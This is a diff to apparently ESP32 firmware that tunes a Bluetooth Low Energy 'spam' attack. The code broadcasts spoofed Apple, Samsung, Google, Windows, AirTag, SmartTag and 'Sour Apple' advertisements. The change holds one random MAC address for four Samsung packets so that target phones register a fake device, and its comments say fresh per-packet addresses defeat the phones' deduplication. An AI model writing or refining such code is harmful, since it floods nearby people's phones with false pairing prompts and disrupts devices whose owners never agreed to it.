@@ -29381,6 +29381,9 @@ struct ble_spam_state_t {
     bool configured;
     bool started;
     lv_timer_t *timer;
+    // Samsung burst optimization: hold MAC stable for 4 packets so Samsung detects a real device
+    ble_addr_t samsung_burst_mac;
+    int samsung_burst_count;  // 0-3: in burst, 4+: move to next mode
 } g_ble_spam_state = {0};
 
 // ── BLE Spam timer callback (called by LVGL every 100ms) ────────────────────────
@@ -29421,8 +29424,42 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
         st->configured = true;
     }
 
+    // Determine mode FIRST so we can decide on MAC strategy below
+    static const int all_modes[] = {
+        BLE_SPAM_MODE_APPLE, BLE_SPAM_MODE_SAMSUNG,
+        BLE_SPAM_MODE_GOOGLE, BLE_SPAM_MODE_WINDOWS,
+        BLE_SPAM_MODE_AIRTAG, BLE_SPAM_MODE_SMARTTAG,
+        BLE_SPAM_MODE_SOUR_APPLE
+    };
+
+    int cur_mode = ble_spam_mode;
+    if (cur_mode == BLE_SPAM_MODE_ALL) {
+        cur_mode = all_modes[st->mode_round % 7];
+
+        // Samsung burst: send 4 packets with same MAC so Samsung detects a stable device
+        if (cur_mode == BLE_SPAM_MODE_SAMSUNG) {
+            if (st->samsung_burst_count == 0) {
+                // Start new burst: generate MAC once, reuse for 4 packets
+                if (ble_hs_id_gen_rnd(1, &st->samsung_burst_mac) != 0) {
+                    ESP_LOGW(TAG, "[SPAM] failed to generate burst MAC for Samsung");
+                }
+            }
+            st->samsung_burst_count++;
+            if (st->samsung_burst_count >= 4) {
+                // Burst complete: move to next mode on next call
+                st->samsung_burst_count = 0;
+                st->mode_round++;
+            }
+        } else {
+            // Non-Samsung mode: advance normally
+            st->samsung_burst_count = 0;
+            st->mode_round++;
+        }
+    }
+
     // Bruce/GhostESP pattern: stop → set_addr → set_data → start per packet
     // Each packet with fresh MAC appears as a new device to phones (defeats per-MAC dedup)
+    // EXCEPTION: Samsung in "All" mode uses burst MAC to give Samsung time to accumulate detections
 
     // Stop instance (if running) before updating address and data
     if (st->started) {
@@ -29433,31 +29470,28 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
 
     // Generate random address (controller accepts set_addr only when stopped/configured)
     ble_addr_t rnd_addr;
-    if (ble_hs_id_gen_rnd(1, &rnd_addr) == 0) {
-        int addr_rc = ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &rnd_addr);
-        if (addr_rc == 0) {
-            ESP_LOGI(TAG, "[SPAM] pkt%d MAC set OK: %02x:%02x:%02x:%02x:%02x:%02x",
-                     ble_spam_count, rnd_addr.val[0], rnd_addr.val[1], rnd_addr.val[2],
-                     rnd_addr.val[3], rnd_addr.val[4], rnd_addr.val[5]);
-        } else {
-            ESP_LOGW(TAG, "[SPAM] pkt%d set_addr FAILED: rc=%d", ble_spam_count, addr_rc);
+    if (ble_spam_mode == BLE_SPAM_MODE_ALL && cur_mode == BLE_SPAM_MODE_SAMSUNG) {
+        // In Samsung burst: reuse the same MAC for 4 packets so device appears stable
+        memcpy(rnd_addr.val, st->samsung_burst_mac.val, 6);
+    } else {
+        // Normal per-packet randomization for all other modes
+        if (ble_hs_id_gen_rnd(1, &rnd_addr) != 0) {
+            ESP_LOGW(TAG, "[SPAM] pkt%d MAC generation failed", ble_spam_count);
+            return;
         }
+    }
+
+    int addr_rc = ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &rnd_addr);
+    if (addr_rc == 0) {
+        ESP_LOGI(TAG, "[SPAM] pkt%d MAC set OK: %02x:%02x:%02x:%02x:%02x:%02x",
+                 ble_spam_count, rnd_addr.val[0], rnd_addr.val[1], rnd_addr.val[2],
+                 rnd_addr.val[3], rnd_addr.val[4], rnd_addr.val[5]);
+    } else {
+        ESP_LOGW(TAG, "[SPAM] pkt%d set_addr FAILED: rc=%d", ble_spam_count, addr_rc);
     }
 
     struct ble_hs_adv_fields fields;
     memset(&fields, 0, sizeof(fields));
-
-    int cur_mode = ble_spam_mode;
-    if (cur_mode == BLE_SPAM_MODE_ALL) {
-        static const int all_modes[] = {
-            BLE_SPAM_MODE_APPLE, BLE_SPAM_MODE_SAMSUNG,
-            BLE_SPAM_MODE_GOOGLE, BLE_SPAM_MODE_WINDOWS,
-            BLE_SPAM_MODE_AIRTAG, BLE_SPAM_MODE_SMARTTAG,
-            BLE_SPAM_MODE_SOUR_APPLE
-        };
-        cur_mode = all_modes[st->mode_round % 7];
-        st->mode_round++;
-    }
 
     // Skip flags for AirTag (29-byte payload + flags exceed legacy 31-byte limit)
     if (cur_mode != BLE_SPAM_MODE_AIRTAG) {
